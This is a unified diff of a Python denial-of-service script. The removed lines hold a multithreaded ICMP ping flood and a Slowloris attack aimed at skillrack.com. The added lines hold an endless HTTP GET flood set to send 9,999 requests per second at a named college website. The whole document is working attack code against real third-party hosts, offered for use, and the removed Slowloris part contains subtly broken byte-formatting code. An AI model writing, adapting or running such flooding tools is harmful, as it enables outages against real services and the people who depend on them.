@@ -1,69 +1,59 @@
-import os
+import requests
 import time
 import threading
+from concurrent.futures import ThreadPoolExecutor
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.util.retry import Retry
 
-def attack():  
-    target_ip = "skillrack.com"
+# List of target URLs
+urls = [
+    'http://pragati.rmkec.ac.in',
+    'http://pragati.rmkec.ac.in'
+]
 
-    packet_size = 70000
+# The number of requests to send per second for each URL
+requests_per_url_per_second = 9999  # Adjust this number as needed
 
-    packet = os.urandom(packet_size)
+# Retry configuration
+retry_strategy = Retry(
+    total=3,  # Number of total retries
+    status_forcelist=[429, 500, 502, 503, 504],
+    allowed_methods=["HEAD", "GET", "OPTIONS"]  # Changed from method_whitelist
+)
+adapter = HTTPAdapter(max_retries=retry_strategy)
+http = requests.Session()
+http.mount("https://", adapter)
+http.mount("http://", adapter)
 
-    os.system(f"ping -c 1 -s {packet_size} {target_ip}")
+def send_request(url):
+    try:
+        response = http.get(url)
+        print(f'{url}: Status Code: {response.status_code}')
+    except requests.exceptions.RequestException as e:
+        print(f'{url}: Error: {e}')
 
-    print(f"Sent a large ICMP echo request packet ({packet_size} bytes) to {target_ip}")
+def run_requests(url, requests_per_second):
+    with ThreadPoolExecutor(max_workers=requests_per_second) as executor:
+        futures = [executor.submit(send_request, url) for _ in range(requests_per_second)]
+        # Wait for all requests to complete
+        for future in futures:
+            future.result()
 
-def main():
-    num_threads = 999  
-
+if __name__ == '__main__':
     while True:
+        start_time = time.time()
+        
+        # Run the request sending process for each URL in parallel
         threads = []
-        for i in range(num_threads):
-            t = threading.Thread(target=attack)
-            threads.append(t)
-            t.start()
-
-        for t in threads:
-            t.join()
-
-        print("Threads finished, restarting...")
-
-if __name__ == "__main__":
-    main()
-
-
-import socket
-import threading
-import time
-
-# Configuration  # Replace with the target IP address
-target_ip = "skillrack.com"
-target_port = 80  # Replace with the target port
-
-def slowloris_attack():
-    while True:
-        try:
-            # Create a new socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(10)
-            s.connect((target_ip, target_port))
-            # Send partial HTTP requests
-            s.send(b"GET / HTTP/1.1\r\n")
-            s.send(b"Host: {}\r\n".format(target_ip).encode())
-            # Keep the connection open
-            while True:
-                s.send(b"X-a: {}\r\n".format('a' * 1000).encode())
-        except Exception as e:
-            print(f"Exception: {e}")
-        finally:
-            s.close()
-
-def main():
-    threads = [threading.Thread(target=slowloris_attack) for _ in range(100)]
-    for thread in threads:
-        thread.start()
-    for thread in threads:
-        thread.join()
-
-if __name__ == "__main__":
-    main()
+        for url in urls:
+            thread = threading.Thread(target=run_requests, args=(url, requests_per_url_per_second))
+            thread.start()
+            threads.append(thread)
+        
+        # Wait for all threads to complete
+        for thread in threads:
+            thread.join()
+        
+        elapsed_time = time.time() - start_time
+        time_to_wait = max(0, 1 - elapsed_time)
+        time.sleep(time_to_wait)
